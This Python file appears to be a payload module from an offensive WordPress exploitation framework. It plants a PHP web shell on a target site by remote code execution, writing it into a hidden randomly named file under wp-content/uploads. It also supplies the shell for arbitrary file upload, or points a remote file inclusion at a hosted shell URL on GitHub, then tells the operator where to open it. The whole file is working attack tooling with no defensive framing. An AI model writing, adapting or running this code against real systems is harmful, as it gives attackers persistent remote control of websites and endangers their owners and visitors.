"""
HWP Payload — Web Shell

Deploys a web-based shell with base64-encoded command transport.

Delivery methods:
    RCE  — Write shell via PHP code execution
    AFU  — Provide file content for direct upload
    RFI  — Provide URL to hosted shell file

Options:
    --path      Path to write shell (default: random in wp-content/uploads)
"""

import random
import string
from pathlib import Path

from hwp import Payload

_DIR = Path(__file__).parent
WEBSHELL_PHP = (_DIR / "webshell.php").read_text(encoding="utf-8")

# Hosted payload URL for RFI delivery
WEBSHELL_RFI_URL = "https://raw.githubusercontent.com/etragardh/hackwp/main/payloads/webshell/webshell.php"


def _rand(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class WebShell(Payload):
    name = "Web Shell"
    methods = ["RCE", "AFU", "RFI"]
    description = "Deploy browser-based web shell (base64-encoded transport)"
    options = [
        {"name": "path", "default": "", "help": "Upload path (blank = random)", "methods": ["RCE"]},
    ]

    def instructions(self):
        if self.method == "RCE":
            path = self.options.get("path", "")
            if not path:
                path = f"wp-content/uploads/.{_rand()}.php"

            self._rce_path = path
            self.info(f"Deploying web shell to: {path}")

            escaped = WEBSHELL_PHP.replace("\\", "\\\\").replace("'", "\\'")

            php = (
                f"<?php "
                f"$f = ABSPATH . '{path}'; "
                f"@mkdir(dirname($f), 0755, true); "
                f"file_put_contents($f, '{escaped}'); "
                f"echo file_exists($f) ? 'SHELL_DEPLOYED' : 'DEPLOY_FAILED'; "
                f"?>"
            )
            return [php]

        elif self.method == "AFU":
            self.info("Providing web shell for upload")
            return [WEBSHELL_PHP]

        elif self.method == "RFI":
            self.info(f"Providing hosted URL: {WEBSHELL_RFI_URL}")
            return [WEBSHELL_RFI_URL]

    def report(self, results):
        for r in results:
            if not r.success:
                self.error("Web shell deployment failed")
                continue

            if self.method == "RCE":
                if r.output and "SHELL_DEPLOYED" in str(r.output):
                    self.success("Web shell deployed!")
                    self.info(f"Open in browser: <target>/{self._rce_path}")
                else:
                    self.error("Web shell deployment failed")

            elif self.method in ("AFU", "RFI"):
                if r.url:
                    self.success("Web shell uploaded!")
                    self.info(f"Open in browser: {r.url}")
                elif r.path:
                    self.success("Web shell uploaded!")
                    self.info(f"Uploaded to: {r.path}")
                else:
                    self.success("Web shell uploaded (check exploit output for location)")
